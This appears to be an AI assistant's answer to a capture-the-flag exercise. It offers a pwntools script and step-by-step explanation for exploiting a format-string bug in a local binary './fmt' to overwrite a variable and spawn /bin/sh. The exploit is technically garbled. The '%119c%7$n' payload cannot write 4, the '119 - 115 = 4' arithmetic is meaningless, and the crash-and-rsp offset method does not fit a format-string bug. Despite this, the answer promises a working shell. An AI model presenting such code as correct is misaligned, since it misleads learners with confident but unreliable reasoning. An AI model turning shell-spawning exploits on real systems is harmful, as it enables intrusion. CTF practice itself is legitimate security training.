To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf(buf)` call. The goal is to control the value of the variable `x` to make it equal to 4, which will trigger the execution of `/bin/sh`.

Here are the steps and the corresponding code to achieve this:

### Steps:
1. **Identify the Vulnerability**: The `printf(buf)` call is vulnerable to a format string attack because it uses the user-controlled `buf` directly without specifying a format string.
2. **Find the Offset**: We need to determine the offset at which the `x` variable is stored on the stack.
3. **Write the Value**: Use the format string to write the value 4 to the `x` variable.
4. **Trigger the Shell**: Once `x` is set to 4, the program will execute `/bin/sh`.

### Code:

```python
from pwn import *

# Set up the process
context.binary = './fmt'
p = process('./fmt')

# Find the offset to the x variable
# You can use pattern_create and pattern_offset to find the offset
pattern = cyclic(80)
p.sendline(pattern)
p.wait()
core = p.corefile
stack = core.rsp
offset = cyclic_find(core.read(stack, 4))
log.info(f"Offset to x: {offset}")

# Address of x (you might need to adjust this based on your environment)
x_addr = 0x0804A02C  # Example address, adjust as needed

# Payload to write 4 to x using format string
payload = b''
payload += b'A' * offset  # Padding to reach the x variable
payload += p32(x_addr)    # Address of x
payload += b'%119c%7$n'   # Write 4 to x (119 - 115 = 4)

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

### Explanation:
1. **Pattern Creation and Offset Finding**:
   - `pattern = cyclic(80)`: Creates a unique pattern of 80 bytes.
   - `p.sendline(pattern)`: Sends the pattern to the program.
   - `p.wait()`: Waits for the program to crash.
   - `core = p.corefile`: Loads the core dump of the crashed program.
   - `stack = core.rsp`: Gets the stack pointer from the core dump.
   - `offset = cyclic_find(core.read(stack, 4))`: Finds the offset of the pattern in the stack.

2. **Payload Construction**:
   - `b'A' * offset`: Pads the payload to reach the `x` variable.
   - `p32(x_addr)`: Converts the address of `x` to a 4-byte little-endian format.
   - `b'%119c%7$n'`: The format string to write the value 4 to the `x` variable. `%119c` ensures that the next parameter (`%7$n`) writes 4 bytes (119 - 115 = 4).

3. **Sending the Payload**:
   - `p.sendline(payload)`: Sends the constructed payload to the program.
   - `p.interactive()`: Interacts with the shell spawned by the program.

### Notes:
- The address `x_addr` might vary depending on your environment. You can find it by disassembling the binary or using a debugger.
- The format string `%119c%7$n` is specific to this example. You might need to adjust the number of characters and the parameter index based on the actual layout of the stack.

By following these steps and running the provided code, you should be able to exploit the format string vulnerability and gain a shell.
